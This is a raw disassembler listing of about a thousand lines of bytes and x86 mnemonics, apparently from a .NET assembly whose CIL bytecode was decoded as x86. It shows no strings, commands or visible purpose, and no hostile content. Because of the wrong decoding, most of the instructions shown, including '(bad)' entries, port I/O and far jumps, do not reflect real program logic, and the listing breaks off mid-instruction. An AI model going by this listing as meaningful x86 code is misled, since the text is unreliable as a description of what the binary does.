  4046e6:	17                   	pop    %ss
  4046e7:	58                   	pop    %eax
  4046e8:	0a 08                	or     (%eax),%cl
  4046ea:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046ed:	34 00                	xor    $0x0,%al
  4046ef:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046f2:	ed                   	in     (%dx),%eax
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 39                	or     (%ecx),%bh
  4046f7:	07                   	pop    %es
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	00 06                	add    %al,(%esi)
  4046fc:	0b dd                	or     %ebp,%ebx
  4046fe:	1c 00                	sbb    $0x0,%al
  404700:	00 00                	add    %al,(%eax)
  404702:	12 03                	adc    (%ebx),%al
  404704:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  40470a:	d1 dd                	rcr    $1,%ebp
  40470c:	0e                   	push   %cs
  40470d:	00 00                	add    %al,(%eax)
  40470f:	00 12                	add    %dl,(%edx)
  404711:	03 fe                	add    %esi,%edi
  404713:	16                   	push   %ss
  404714:	04 00                	add    $0x0,%al
  404716:	00 1b                	add    %bl,(%ebx)
  404718:	6f                   	outsl  %ds:(%esi),(%dx)
  404719:	33 00                	xor    (%eax),%eax
  40471b:	00 0a                	add    %cl,(%edx)
  40471d:	dc 07                	faddl  (%edi)
  40471f:	2a 01                	sub    (%ecx),%al
  404721:	10 00                	adc    %al,(%eax)
  404723:	00 02                	add    %al,(%edx)
  404725:	00 17                	add    %dl,(%edi)
  404727:	00 39                	add    %bh,(%ecx)
  404729:	50                   	push   %eax
  40472a:	00 0e                	add    %cl,(%esi)
  40472c:	00 00                	add    %al,(%eax)
  40472e:	00 00                	add    %al,(%eax)
  404730:	13 30                	adc    (%eax),%esi
  404732:	02 00                	add    (%eax),%al
  404734:	1e                   	push   %ds
  404735:	00 00                	add    %al,(%eax)
  404737:	00 01                	add    %al,(%ecx)
  404739:	00 00                	add    %al,(%eax)
  40473b:	11 02                	adc    %eax,(%edx)
  40473d:	03 28                	add    (%eax),%ebp
  40473f:	6d                   	insl   (%dx),%es:(%edi)
  404740:	00 00                	add    %al,(%eax)
  404742:	06                   	push   %es
  404743:	0a 06                	or     (%esi),%al
  404745:	15 40 02 00 00       	adc    $0x240,%eax
  40474a:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  40474d:	02 7b 38             	add    0x38(%ebx),%bh
  404750:	00 00                	add    %al,(%eax)
  404752:	04 06                	add    $0x6,%al
  404754:	6f                   	outsl  %ds:(%esi),(%dx)
  404755:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  40475c:	13 30                	adc    (%eax),%esi
  40475e:	04 00                	add    $0x0,%al
  404760:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  404765:	00 00                	add    %al,(%eax)
  404767:	11 02                	adc    %eax,(%edx)
  404769:	7b 38                	jnp    0x4047a3
  40476b:	00 00                	add    %al,(%eax)
  40476d:	04 6f                	add    $0x6f,%al
  40476f:	eb 00                	jmp    0x404771
  404771:	00 0a                	add    %cl,(%edx)
  404773:	0a 06                	or     (%esi),%al
  404775:	1f                   	pop    %ds
  404776:	0f 3d                	(bad)
  404778:	16                   	push   %ss
  404779:	00 00                	add    %al,(%eax)
  40477b:	00 20                	add    %ah,(%eax)
  40477d:	80 00 00             	addb   $0x0,(%eax)
  404780:	00 06                	add    %al,(%esi)
  404782:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404785:	0b 03                	or     (%ebx),%eax
  404787:	07                   	pop    %es
  404788:	6f                   	outsl  %ds:(%esi),(%dx)
  404789:	ee                   	out    %al,(%dx)
  40478a:	00 00                	add    %al,(%eax)
  40478c:	0a 38                	or     (%eax),%bh
  40478e:	59                   	pop    %ecx
  40478f:	00 00                	add    %al,(%eax)
  404791:	00 06                	add    %al,(%esi)
  404793:	20 ff                	and    %bh,%bh
  404795:	ff 00                	incl   (%eax)
  404797:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40479d:	20 de                	and    %bl,%dh
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	00 0b                	add    %cl,(%ebx)
  4047a3:	03 07                	add    (%edi),%eax
  4047a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a6:	ee                   	out    %al,(%dx)
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	0a 06                	or     (%esi),%al
  4047ab:	68 28 ef 00 00       	push   $0xef28
  4047b0:	0a 28                	or     (%eax),%ch
  4047b2:	58                   	pop    %eax
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	06                   	push   %es
  4047b6:	0c 03                	or     $0x3,%al
  4047b8:	08 16                	or     %dl,(%esi)
  4047ba:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c0:	00 0a                	add    %cl,(%edx)
  4047c2:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	20 df                	and    %bl,%bh
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	00 0b                	add    %cl,(%ebx)
  4047cd:	03 07                	add    (%edi),%eax
  4047cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d0:	ee                   	out    %al,(%dx)
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	0a 06                	or     (%esi),%al
  4047d5:	28 4a 00             	sub    %cl,0x0(%edx)
  4047d8:	00 0a                	add    %cl,(%edx)
  4047da:	28 58 00             	sub    %bl,0x0(%eax)
  4047dd:	00 06                	add    %al,(%esi)
  4047df:	0c 03                	or     $0x3,%al
  4047e1:	08 16                	or     %dl,(%esi)
  4047e3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047e9:	00 0a                	add    %cl,(%edx)
  4047eb:	16                   	push   %ss
  4047ec:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f1:	00 03                	add    %al,(%ebx)
  4047f3:	02 7b 38             	add    0x38(%ebx),%bh
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	04 09                	add    $0x9,%al
  4047fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047fb:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  404802:	00 04 28             	add    %al,(%eax,%ebp,1)
  404805:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 09                	add    $0x9,%al
  404810:	6f                   	outsl  %ds:(%esi),(%dx)
  404811:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404818:	00 00                	add    %al,(%eax)
  40481a:	06                   	push   %es
  40481b:	09 17                	or     %edx,(%edi)
  40481d:	58                   	pop    %eax
  40481e:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  404823:	2a 13                	sub    (%ebx),%dl
  404825:	30 04 00             	xor    %al,(%eax,%eax,1)
  404828:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 1f                	add    %bl,(%edi)
  40482d:	00 00                	add    %al,(%eax)
  40482f:	11 02                	adc    %eax,(%edx)
  404831:	7b 38                	jnp    0x40486b
  404833:	00 00                	add    %al,(%eax)
  404835:	04 6f                	add    $0x6f,%al
  404837:	eb 00                	jmp    0x404839
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	0a 06                	or     (%esi),%al
  40483d:	1f                   	pop    %ds
  40483e:	0f 3d                	(bad)
  404840:	16                   	push   %ss
  404841:	00 00                	add    %al,(%eax)
  404843:	00 20                	add    %ah,(%eax)
  404845:	90                   	nop
  404846:	00 00                	add    %al,(%eax)
  404848:	00 06                	add    %al,(%esi)
  40484a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40484d:	0b 03                	or     (%ebx),%eax
  40484f:	07                   	pop    %es
  404850:	6f                   	outsl  %ds:(%esi),(%dx)
  404851:	ee                   	out    %al,(%dx)
  404852:	00 00                	add    %al,(%eax)
  404854:	0a 38                	or     (%eax),%bh
  404856:	59                   	pop    %ecx
  404857:	00 00                	add    %al,(%eax)
  404859:	00 06                	add    %al,(%esi)
  40485b:	20 ff                	and    %bh,%bh
  40485d:	ff 00                	incl   (%eax)
  40485f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  404865:	20 dc                	and    %bl,%ah
  404867:	00 00                	add    %al,(%eax)
  404869:	00 0b                	add    %cl,(%ebx)
  40486b:	03 07                	add    (%edi),%eax
  40486d:	6f                   	outsl  %ds:(%esi),(%dx)
  40486e:	ee                   	out    %al,(%dx)
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a 06                	or     (%esi),%al
  404873:	68 28 ef 00 00       	push   $0xef28
  404878:	0a 28                	or     (%eax),%ch
  40487a:	58                   	pop    %eax
  40487b:	00 00                	add    %al,(%eax)
  40487d:	06                   	push   %es
  40487e:	0c 03                	or     $0x3,%al
  404880:	08 16                	or     %dl,(%esi)
  404882:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404888:	00 0a                	add    %cl,(%edx)
  40488a:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  40488d:	00 00                	add    %al,(%eax)
  40488f:	20 dd                	and    %bl,%ch
  404891:	00 00                	add    %al,(%eax)
  404893:	00 0b                	add    %cl,(%ebx)
  404895:	03 07                	add    (%edi),%eax
  404897:	6f                   	outsl  %ds:(%esi),(%dx)
  404898:	ee                   	out    %al,(%dx)
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 06                	or     (%esi),%al
  40489d:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a0:	00 0a                	add    %cl,(%edx)
  4048a2:	28 58 00             	sub    %bl,0x0(%eax)
  4048a5:	00 06                	add    %al,(%esi)
  4048a7:	0c 03                	or     $0x3,%al
  4048a9:	08 16                	or     %dl,(%esi)
  4048ab:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	16                   	push   %ss
  4048b4:	0d 38 16 00 00       	or     $0x1638,%eax
  4048b9:	00 02                	add    %al,(%edx)
  4048bb:	7b 38                	jnp    0x4048f5
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	04 09                	add    $0x9,%al
  4048c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4048c2:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	06                   	push   %es
  4048cc:	09 17                	or     %edx,(%edi)
  4048ce:	58                   	pop    %eax
  4048cf:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048d4:	2a 00                	sub    (%eax),%al
  4048d6:	00 00                	add    %al,(%eax)
  4048d8:	13 30                	adc    (%eax),%esi
  4048da:	02 00                	add    (%eax),%al
  4048dc:	99                   	cltd
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	00 20                	add    %ah,(%eax)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	11 02                	adc    %eax,(%edx)
  4048e5:	7b 36                	jnp    0x40491d
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	04 0a                	add    $0xa,%al
  4048eb:	06                   	push   %es
  4048ec:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048ef:	07                   	pop    %es
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	00 22                	add    %ah,(%edx)
  4048f4:	00 00                	add    %al,(%eax)
  4048f6:	00 05 00 00 00 16    	add    %al,0x16000000
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 6b 00             	add    %ch,0x0(%ebx)
  404901:	00 00                	add    %al,(%eax)
  404903:	38 00                	cmp    %al,(%eax)
  404905:	00 00                	add    %al,(%eax)
  404907:	49                   	dec    %ecx
  404908:	00 00                	add    %al,(%eax)
  40490a:	00 5a 00             	add    %bl,0x0(%edx)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	38 66 00             	cmp    %ah,0x0(%esi)
  404912:	00 00                	add    %al,(%eax)
  404914:	02 7b 35             	add    0x35(%ebx),%bh
  404917:	00 00                	add    %al,(%eax)
  404919:	04 a5                	add    $0xa5,%al
  40491b:	68 00 00 01 28       	push   $0x28010000
  404920:	f0 00 00             	lock add %al,(%eax)
  404923:	0a 2a                	or     (%edx),%ch
  404925:	02 7b 35             	add    0x35(%ebx),%bh
  404928:	00 00                	add    %al,(%eax)
  40492a:	04 a5                	add    $0xa5,%al
  40492c:	95                   	xchg   %eax,%ebp
  40492d:	00 00                	add    %al,(%eax)
  40492f:	01 2a                	add    %ebp,(%edx)
  404931:	02 7b 35             	add    0x35(%ebx),%bh
  404934:	00 00                	add    %al,(%eax)
  404936:	04 6f                	add    $0x6f,%al
  404938:	38 00                	cmp    %al,(%eax)
  40493a:	00 0a                	add    %cl,(%edx)
  40493c:	6f                   	outsl  %ds:(%esi),(%dx)
  40493d:	f1                   	int1
  40493e:	00 00                	add    %al,(%eax)
  404940:	0a 28                	or     (%eax),%ch
  404942:	f2 00 00             	repnz add %al,(%eax)
  404945:	0a 2a                	or     (%edx),%ch
  404947:	02 7b 35             	add    0x35(%ebx),%bh
  40494a:	00 00                	add    %al,(%eax)
  40494c:	04 a5                	add    $0xa5,%al
  40494e:	96                   	xchg   %eax,%esi
  40494f:	00 00                	add    %al,(%eax)
  404951:	01 28                	add    %ebp,(%eax)
  404953:	f3 00 00             	repz add %al,(%eax)
  404956:	0a 2a                	or     (%edx),%ch
  404958:	02 7b 35             	add    0x35(%ebx),%bh
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 a5                	add    $0xa5,%al
  40495f:	97                   	xchg   %eax,%edi
  404960:	00 00                	add    %al,(%eax)
  404962:	01 28                	add    %ebp,(%eax)
  404964:	f4                   	hlt
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 2a                	or     (%edx),%ch
  404969:	02 7b 35             	add    0x35(%ebx),%bh
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 a5                	add    $0xa5,%al
  404970:	6b 00 00             	imul   $0x0,(%eax),%eax
  404973:	01 28                	add    %ebp,(%eax)
  404975:	f5                   	cmc
  404976:	00 00                	add    %al,(%eax)
  404978:	0a 2a                	or     (%edx),%ch
  40497a:	16                   	push   %ss
  40497b:	6a 2a                	push   $0x2a
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 13                	add    %dl,(%ebx)
  404981:	30 02                	xor    %al,(%edx)
  404983:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404989:	00 00                	add    %al,(%eax)
  40498b:	11 02                	adc    %eax,(%edx)
  40498d:	7b 36                	jnp    0x4049c5
  40498f:	00 00                	add    %al,(%eax)
  404991:	04 0a                	add    $0xa,%al
  404993:	06                   	push   %es
  404994:	1a 59 45             	sbb    0x45(%ecx),%bl
  404997:	07                   	pop    %es
  404998:	00 00                	add    %al,(%eax)
  40499a:	00 22                	add    %ah,(%edx)
  40499c:	00 00                	add    %al,(%eax)
  40499e:	00 05 00 00 00 11    	add    %al,0x11000000
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 6b 00             	add    %ch,0x0(%ebx)
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	38 00                	cmp    %al,(%eax)
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	49                   	dec    %ecx
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	00 5a 00             	add    %bl,0x0(%edx)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	38 66 00             	cmp    %ah,0x0(%esi)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	02 7b 35             	add    0x35(%ebx),%bh
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	04 a5                	add    $0xa5,%al
  4049c3:	68 00 00 01 2a       	push   $0x2a010000
  4049c8:	02 7b 35             	add    0x35(%ebx),%bh
  4049cb:	00 00                	add    %al,(%eax)
  4049cd:	04 a5                	add    $0xa5,%al
  4049cf:	68 00 00 01 28       	push   $0x28010000
  4049d4:	f6 00 00             	testb  $0x0,(%eax)
  4049d7:	0a 2a                	or     (%edx),%ch
  4049d9:	02 7b 35             	add    0x35(%ebx),%bh
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	04 6f                	add    $0x6f,%al
  4049e0:	38 00                	cmp    %al,(%eax)
  4049e2:	00 0a                	add    %cl,(%edx)
  4049e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e5:	f1                   	int1
  4049e6:	00 00                	add    %al,(%eax)
  4049e8:	0a 28                	or     (%eax),%ch
  4049ea:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f0:	7b 35                	jnp    0x404a27
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 a5                	add    $0xa5,%al
  4049f6:	96                   	xchg   %eax,%esi
  4049f7:	00 00                	add    %al,(%eax)
  4049f9:	01 28                	add    %ebp,(%eax)
  4049fb:	f8                   	clc
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	0a 2a                	or     (%edx),%ch
  404a00:	02 7b 35             	add    0x35(%ebx),%bh
  404a03:	00 00                	add    %al,(%eax)
  404a05:	04 a5                	add    $0xa5,%al
  404a07:	97                   	xchg   %eax,%edi
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	01 28                	add    %ebp,(%eax)
  404a0c:	f9                   	stc
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	0a 2a                	or     (%edx),%ch
  404a11:	02 7b 35             	add    0x35(%ebx),%bh
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 a5                	add    $0xa5,%al
  404a18:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a1b:	01 28                	add    %ebp,(%eax)
  404a1d:	fa                   	cli
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	0a 2a                	or     (%edx),%ch
  404a22:	16                   	push   %ss
  404a23:	6a 2a                	push   $0x2a
  404a25:	00 00                	add    %al,(%eax)
  404a27:	00 13                	add    %dl,(%ebx)
  404a29:	30 02                	xor    %al,(%edx)
  404a2b:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a31:	00 00                	add    %al,(%eax)
  404a33:	11 02                	adc    %eax,(%edx)
  404a35:	7b 36                	jnp    0x404a6d
  404a37:	00 00                	add    %al,(%eax)
  404a39:	04 0a                	add    $0xa,%al
  404a3b:	06                   	push   %es
  404a3c:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a3f:	07                   	pop    %es
  404a40:	00 00                	add    %al,(%eax)
  404a42:	00 16                	add    %dl,(%esi)
  404a44:	00 00                	add    %al,(%eax)
  404a46:	00 05 00 00 00 52    	add    %al,0x52000000
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 52 00             	add    %dl,0x0(%edx)
  404a51:	00 00                	add    %al,(%eax)
  404a53:	27                   	daa
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 33                	add    %dh,(%ebx)
  404a58:	00 00                	add    %al,(%eax)
  404a5a:	00 40 00             	add    %al,0x0(%eax)
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a62:	00 00                	add    %al,(%eax)
  404a64:	02 7b 35             	add    0x35(%ebx),%bh
  404a67:	00 00                	add    %al,(%eax)
  404a69:	04 a5                	add    $0xa5,%al
  404a6b:	68 00 00 01 28       	push   $0x28010000
  404a70:	fb                   	sti
  404a71:	00 00                	add    %al,(%eax)
  404a73:	0a 2a                	or     (%edx),%ch
  404a75:	02 7b 35             	add    0x35(%ebx),%bh
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	04 74                	add    $0x74,%al
  404a7c:	38 00                	cmp    %al,(%eax)
  404a7e:	00 01                	add    %al,(%ecx)
  404a80:	28 fc                	sub    %bh,%ah
  404a82:	00 00                	add    %al,(%eax)
  404a84:	0a 2a                	or     (%edx),%ch
  404a86:	02 7b 35             	add    0x35(%ebx),%bh
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 a5                	add    $0xa5,%al
  404a8d:	96                   	xchg   %eax,%esi
  404a8e:	00 00                	add    %al,(%eax)
  404a90:	01 2a                	add    %ebp,(%edx)
  404a92:	02 7b 35             	add    0x35(%ebx),%bh
  404a95:	00 00                	add    %al,(%eax)
  404a97:	04 a5                	add    $0xa5,%al
  404a99:	97                   	xchg   %eax,%edi
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa0:	7b 35                	jnp    0x404ad7
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	04 a5                	add    $0xa5,%al
  404aa6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404aa9:	01 28                	add    %ebp,(%eax)
  404aab:	fa                   	cli
  404aac:	00 00                	add    %al,(%eax)
  404aae:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404aba:	2a 00                	sub    (%eax),%al
  404abc:	13 30                	adc    (%eax),%esi
  404abe:	02 00                	add    (%eax),%al
  404ac0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	00 21                	add    %ah,(%ecx)
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	11 02                	adc    %eax,(%edx)
  404ac9:	7b 36                	jnp    0x404b01
  404acb:	00 00                	add    %al,(%eax)
  404acd:	04 0a                	add    $0xa,%al
  404acf:	06                   	push   %es
  404ad0:	1a 59 45             	sbb    0x45(%ecx),%bl
  404ad3:	08 00                	or     %al,(%eax)
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	16                   	push   %ss
  404ad8:	00 00                	add    %al,(%eax)
  404ada:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 6e 00             	add    %ch,0x0(%esi)
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	27                   	daa
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 38                	add    %bh,(%eax)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	00 49 00             	add    %cl,0x0(%ecx)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	62 00                	bound  %eax,(%eax)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	38 69 00             	cmp    %ch,0x0(%ecx)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	02 7b 35             	add    0x35(%ebx),%bh
  404aff:	00 00                	add    %al,(%eax)
  404b01:	04 a5                	add    $0xa5,%al
  404b03:	68 00 00 01 28       	push   $0x28010000
  404b08:	e7 00                	out    %eax,$0x0
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	2a 02                	sub    (%edx),%al
  404b0e:	7b 35                	jnp    0x404b45
  404b10:	00 00                	add    %al,(%eax)
  404b12:	04 6f                	add    $0x6f,%al
  404b14:	38 00                	cmp    %al,(%eax)
  404b16:	00 0a                	add    %cl,(%edx)
  404b18:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b1c:	06                   	push   %es
  404b1d:	2a 02                	sub    (%edx),%al
  404b1f:	7b 35                	jnp    0x404b56
  404b21:	00 00                	add    %al,(%eax)
  404b23:	04 a5                	add    $0xa5,%al
  404b25:	96                   	xchg   %eax,%esi
  404b26:	00 00                	add    %al,(%eax)
  404b28:	01 28                	add    %ebp,(%eax)
  404b2a:	e8 00 00 0a 2a       	call   0x2a4a4b2f
  404b2f:	02 7b 35             	add    0x35(%ebx),%bh
  404b32:	00 00                	add    %al,(%eax)
  404b34:	04 a5                	add    $0xa5,%al
  404b36:	97                   	xchg   %eax,%edi
  404b37:	00 00                	add    %al,(%eax)
  404b39:	01 28                	add    %ebp,(%eax)
  404b3b:	fd                   	std
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	0a 2a                	or     (%edx),%ch
  404b40:	02 7b 35             	add    0x35(%ebx),%bh
  404b43:	00 00                	add    %al,(%eax)
  404b45:	04 a5                	add    $0xa5,%al
  404b47:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b4a:	01 0b                	add    %ecx,(%ebx)
  404b4c:	12 01                	adc    (%ecx),%al
  404b4e:	28 fe                	sub    %bh,%dh
  404b50:	00 00                	add    %al,(%eax)
  404b52:	0a 28                	or     (%eax),%ch
  404b54:	e7 00                	out    %eax,$0x0
  404b56:	00 0a                	add    %cl,(%edx)
  404b58:	2a 02                	sub    (%edx),%al
  404b5a:	7b 35                	jnp    0x404b91
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	04 74                	add    $0x74,%al
  404b60:	02 00                	add    (%eax),%al
  404b62:	00 1b                	add    %bl,(%ebx)
  404b64:	2a 16                	sub    (%esi),%dl
  404b66:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b6a:	01 2a                	add    %ebp,(%edx)
  404b6c:	13 30                	adc    (%eax),%esi
  404b6e:	04 00                	add    $0x0,%al
  404b70:	4b                   	dec    %ebx
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 22                	add    %ah,(%edx)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 03                	adc    %eax,(%ebx)
  404b79:	28 6a 00             	sub    %ch,0x0(%edx)
  404b7c:	00 0a                	add    %cl,(%edx)
  404b7e:	39 3e                	cmp    %edi,(%esi)
  404b80:	00 00                	add    %al,(%eax)
  404b82:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b85:	03 19                	add    (%ecx),%ebx
  404b87:	17                   	pop    %ss
  404b88:	17                   	pop    %ss
  404b89:	73 ff                	jae    0x404b8a
  404b8b:	00 00                	add    %al,(%eax)
  404b8d:	0a 0b                	or     (%ebx),%cl
  404b8f:	07                   	pop    %es
  404b90:	6f                   	outsl  %ds:(%esi),(%dx)
  404b91:	e2 00                	loop   0x404b93
  404b93:	00 0a                	add    %cl,(%edx)
  404b95:	d4 8d                	aam    $0x8d
  404b97:	44                   	inc    %esp
  404b98:	00 00                	add    %al,(%eax)
  404b9a:	01 0a                	add    %ecx,(%edx)
  404b9c:	07                   	pop    %es
  404b9d:	06                   	push   %es
  404b9e:	16                   	push   %ss
  404b9f:	07                   	pop    %es
  404ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba1:	e2 00                	loop   0x404ba3
  404ba3:	00 0a                	add    %cl,(%edx)
  404ba5:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bac:	07                   	pop    %es
  404bad:	6f                   	outsl  %ds:(%esi),(%dx)
  404bae:	9f                   	lahf
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	0a 07                	or     (%edi),%al
  404bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb4:	40                   	inc    %eax
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	0a 02                	or     (%edx),%al
  404bb9:	06                   	push   %es
  404bba:	28 79 00             	sub    %bh,0x0(%ecx)
  404bbd:	00 06                	add    %al,(%esi)
  404bbf:	17                   	pop    %ss
  404bc0:	2a 16                	sub    (%esi),%dl
  404bc2:	2a 00                	sub    (%eax),%al
  404bc4:	13 30                	adc    (%eax),%esi
  404bc6:	05 00 40 00 00       	add    $0x4000,%eax
  404bcb:	00 00                	add    %al,(%eax)
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 02                	add    %al,(%edx)
  404bd1:	7b 35                	jnp    0x404c08
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	04 39                	add    $0x39,%al
  404bd7:	33 00                	xor    (%eax),%eax
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404bde:	6c                   	insb   (%dx),%es:(%edi)
  404bdf:	00 00                	add    %al,(%eax)
  404be1:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404be7:	00 04 74             	add    %al,(%esp,%esi,2)
  404bea:	02 00                	add    (%eax),%al
  404bec:	00 1b                	add    %bl,(%ebx)
  404bee:	16                   	push   %ss
  404bef:	02 7b 35             	add    0x35(%ebx),%bh
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	04 74                	add    $0x74,%al
  404bf6:	02 00                	add    (%eax),%al
  404bf8:	00 1b                	add    %bl,(%ebx)
  404bfa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404bfd:	4c                   	dec    %esp
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c06:	0a 6f 40             	or     0x40(%edi),%ch
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	0a 17                	or     (%edi),%dl
  404c0d:	2a 16                	sub    (%esi),%dl
  404c0f:	2a 13                	sub    (%ebx),%dl
  404c11:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c14:	af                   	scas   %es:(%edi),%eax
  404c15:	00 00                	add    %al,(%eax)
  404c17:	00 23                	add    %ah,(%ebx)
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	11 02                	adc    %eax,(%edx)
  404c1d:	0a 03                	or     (%ebx),%al
  404c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c20:	f1                   	int1
  404c21:	00 00                	add    %al,(%eax)
  404c23:	0a 19                	or     (%ecx),%bl
  404c25:	8d 39                	lea    (%ecx),%edi
  404c27:	00 00                	add    %al,(%eax)
  404c29:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c2f:	04 28                	add    $0x28,%al
  404c31:	e4 00                	in     $0x0,%al
  404c33:	00 0a                	add    %cl,(%edx)
  404c35:	6f                   	outsl  %ds:(%esi),(%dx)
  404c36:	26 00 00             	add    %al,%es:(%eax)
  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
